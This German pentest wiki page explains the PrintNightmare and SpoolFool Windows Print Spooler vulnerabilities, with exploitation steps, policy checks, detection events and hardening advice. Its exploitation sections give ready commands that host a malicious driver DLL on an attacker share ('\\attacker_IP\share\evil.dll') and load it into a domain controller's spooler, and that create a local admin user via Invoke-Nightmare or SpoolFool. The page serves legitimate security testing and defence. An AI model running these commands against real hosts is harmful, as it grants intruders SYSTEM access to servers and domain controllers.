# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare ist die Sammelbezeichnung für eine Gruppe von Schwachstellen im Windows-Dienst **Print Spooler**, die **beliebige Codeausführung als SYSTEM** und, wenn der Spooler über RPC erreichbar ist, **Remote Code Execution (RCE) auf Domain Controllern und File Servern** ermöglichen. Die am häufigsten ausgenutzten CVEs sind **CVE-2021-1675** (ursprünglich als LPE eingestuft) und **CVE-2021-34527** (vollständige RCE). Nachfolgende Probleme wie **CVE-2021-34481 („Point & Print“)** und **CVE-2022-21999 („SpoolFool“)** beweisen, dass die Angriffsfläche noch lange nicht geschlossen ist.

Wenn du nach **Authentication Coercion / Relay** über den Spooler statt nach **treiberbasierter RCE/LPE** suchst, siehe [diese andere Seite über den Missbrauch von Printer Coercion](printers-spooler-service-abuse.md). Diese Seite konzentriert sich auf das **Laden von Treibern / DLLs als SYSTEM**.

---

## 1. Verwundbare Komponenten & CVEs

| Jahr | CVE | Kurzname | Primitive | Hinweise |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|„PrintNightmare #1“|LPE|Im Juni 2021 CU gepatcht, aber durch CVE-2021-34527 umgangen|
|2021|CVE-2021-34527|„PrintNightmare“|RCE/LPE|`AddPrinterDriverEx` ermöglicht authentifizierten Benutzern, eine Treiber-DLL von einer Remote-Freigabe zu laden; nach August 2021 erfordert dies normalerweise abgeschwächte Point & Print-Richtlinien|
|2021|CVE-2021-34481|„Point & Print“|LPE|Installation unsignierter Treiber durch Benutzer ohne Administratorrechte|
|2022|CVE-2022-21999|„SpoolFool“|LPE|Erstellung beliebiger Verzeichnisse → DLL planting – funktioniert nach den Patches von 2021|

Alle nutzen eine der **MS-RPRN / MS-PAR RPC-Methoden** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) oder Vertrauensbeziehungen innerhalb von **Point & Print** aus.

## 2. Exploitation-Techniken

### 2.1 Kompromittierung eines Remote Domain Controllers (CVE-2021-34527)

Ein authentifizierter, aber **nicht privilegierter** Domain-Benutzer kann beliebige DLLs als **NT AUTHORITY\SYSTEM** auf einem Remote-Spooler (häufig dem DC) ausführen, indem er:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Beliebte PoCs umfassen **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) sowie Benjamin Delpys Module `misc::printnightmare / lsa::addsid` in **mimikatz**.

### 2.2 Lokale Privilege Escalation (jedes unterstützte Windows, 2021-2024)

Dieselbe API kann **lokal** aufgerufen werden, um einen Treiber aus `C:\Windows\System32\spool\drivers\x64\3\` zu laden und SYSTEM privileges zu erlangen:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Moderne Triage auf gepatchten Hosts

Auf einem vollständig aktualisierten Host schlagen öffentliche PrintNightmare-PoCs oft fehl, da Windows nun standardmäßig die Installation von Druckertreibern nur durch **Administratoren** erlaubt (`RestrictDriverInstallationToAdministrators=1` seit dem 10. August 2021). Bevor du einen Exploit gegen ein Ziel einsetzt, prüfe zunächst, ob die Umgebung diese Sicherheitsänderung für ältere Druckerbereitstellungen rückgängig gemacht hat:<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Die zwei interessantesten schwachen Werte sind normalerweise:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Von Linux aus sollte zunächst schnell bestätigt werden, dass das Ziel die relevanten Print-RPC-Schnittstellen bereitstellt, bevor ein PoC ausgeführt wird:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Einige neuere öffentlich verfügbare Tools bieten außerdem einen sichereren **check/list**-Workflow, bevor eine DLL gesendet wird:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Wenn du als Benutzer mit niedrigen Berechtigungen `RPC_E_ACCESS_DENIED` (`0x8001011b`) erhältst, siehst du normalerweise das Verhalten nach 2021 und keinen Transportfehler.

> Unter Windows 11 22H2+ und neueren Client-Builds verwendet der Remote-Druck standardmäßig **RPC over TCP**, und **RPC over named pipes** (`\PIPE\spoolss`) ist deaktiviert, sofern es nicht ausdrücklich wieder aktiviert wird. Einige ältere PoCs und Labornotizen gehen weiterhin davon aus, dass die Named Pipe erreichbar ist.<sup>[[4]](#references)</sup>

### 2.4 Missbrauch von Package Point & Print in „gepatchten“ Netzwerken

Viele Unternehmensumgebungen blieben aufgrund ihrer Richtlinien nach den ursprünglichen Patches von 2021 **verwundbar**, weil Helpdesk- oder Print-Server-Workflows weiterhin erforderten, dass Benutzer ohne Administratorrechte Treiber installieren oder aktualisieren konnten. In der Praxis sieht das offensive Vorgehen folgendermaßen aus:

- Wenn Sicherheitsabfragen vollständig deaktiviert sind, ist **klassisches PrintNightmare mit beliebiger DLL** weiterhin der kürzeste Weg.
- Wenn `Only use Package Point and Print` aktiviert ist, musst du normalerweise auf einen Pfad mit einem **signierten, package-aware Treiber** ausweichen, anstatt eine rohe DLL abzulegen.<sup>[[3]](#references)</sup>
- Untersuchungen aus dem Jahr 2024 zeigten, dass **`Package Point and Print - Approved servers` allein keine harte Vertrauensgrenze darstellt**: Wenn ein Angreifer die Namensauflösung für einen zugelassenen Print-Server fälschen oder übernehmen kann, können Opfer weiterhin auf einen bösartigen Server umgeleitet werden, der die Richtlinienprüfungen erfüllt.<sup>[[4]](#references)</sup>
- Selbst die Kombination aus UNC-Härtung und erzwungenem RPC-over-SMB kann unzuverlässig sein, da moderne Clients möglicherweise **auf RPC over TCP zurückfallen**.<sup>[[4]](#references)</sup>

Deshalb geht es bei moderner PrintNightmare-ähnlicher Ausnutzung häufig eher um den **Missbrauch von Richtlinien zur Druckerbereitstellung in Unternehmen**, als darum, den ursprünglichen PoC von 2021 unverändert erneut abzuspielen.

### 2.5 SpoolFool (CVE-2022-21999) – Umgehen der Fixes von 2021

Die Patches von Microsoft aus dem Jahr 2021 blockierten das Laden von Treibern aus der Ferne, **härteten jedoch nicht die Verzeichnisberechtigungen**. SpoolFool missbraucht den Parameter `SpoolDirectory`, um ein beliebiges Verzeichnis unter `C:\Windows\System32\spool\drivers\` zu erstellen, legt eine Payload-DLL ab und zwingt den Spooler, sie zu laden:<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Der Exploit funktioniert auf vollständig gepatchtem Windows 7 → Windows 11 und Server 2012R2 → 2022 vor den Updates vom Februar 2022<sup>[[2]](#references)</sup>

---

## 3. Erkennung & Hunting

* **PrintService-Logs** – aktiviere den Kanal *Microsoft-Windows-PrintService/Operational* und überwache **Event ID 316** (Treiber hinzugefügt/aktualisiert, enthält normalerweise die DLL-Namen) bei erfolgreichen und fehlgeschlagenen Versuchen. Kombiniere dies mit **Event ID 808/811** für verdächtige Fehler beim Laden von Spooler-Modulen/Treibern.
* **Sysmon** – `Event ID 7` (Image loaded) oder `11/23` (File write/delete) innerhalb von `C:\Windows\System32\spool\drivers\*`, wenn der Parent-Prozess **spoolsv.exe** ist.
* **Process lineage** – löse einen Alert aus, sobald **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell oder einen anderen unerwarteten unsignierten Child-Prozess startet.
* **Network telemetry** – unerwartete SMB-Abrufe von `spoolsv.exe` zu von Angreifern kontrollierten Shares oder ungewöhnlicher Printer-RPC-Traffic von Servern, die nicht als Printserver fungieren sollten, sind beides aussagekräftige Hinweise.

## 4. Mitigation & Hardening

1. **Patchen!** – Installiere das aktuelle cumulative Update auf jedem Windows-Host, auf dem der Print Spooler-Dienst installiert ist.
2. **Deaktiviere den Spooler, wo er nicht benötigt wird**, insbesondere auf Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Blockiere Remote-Verbindungen**, während lokales Drucken weiterhin erlaubt wird – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Halte Point & Print auf Administratoren beschränkt**, indem du Folgendes setzt:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Detaillierte Hinweise in Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Falls geschäftliche Anforderungen `RestrictDriverInstallationToAdministrators=0` erzwingen, behandle jede andere Printer Policy nur als **partielle Mitigation**. Bevorzuge mindestens **package-aware drivers**, aktiviere **Only use Package Point and Print** und beschränke **Package Point and Print - Approved servers** auf ausdrücklich festgelegte Printserver innerhalb des Forests.<sup>[[3]](#references)</sup>
6. **Setze die Printer-RPC-Privacy nicht zurück**, nur um fehlerhafte Printer Mappings zu beheben. Umgebungen, die `RpcAuthnLevelPrivacyEnabled=0` setzen, machen das für **CVE-2021-1678** hinzugefügte Hardening rückgängig und verdienen während eines Engagements normalerweise besondere Aufmerksamkeit.<sup>[[4]](#references)</sup>

---

## 5. Verwandte Forschung / Tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)-Module
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standardmäßige Impacket-Implementierung mit den Modi `-check`, `-list` und `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – Wrapper mit integriertem SMB-Delivery, Multi-Target-Support sowie `MS-RPRN`- und `MS-PAR`-Modi
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – Missbrauch eines mitgebrachten verwundbaren Printer-Treibers über package Point & Print
* SpoolFool-Exploit & Write-up
* 0patch-Micropatches für SpoolFool und andere Spooler-Bugs

Wenn du über den Spooler **Authentication erzwingen** möchtest, anstatt einen Treiber zu laden, springe zu [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## Referenzen

- [1] [Microsoft – KB5005652: Manage new Point & Print default driver installation behavior](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – A Practical Guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – The PrintNightmare is not Over Yet](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
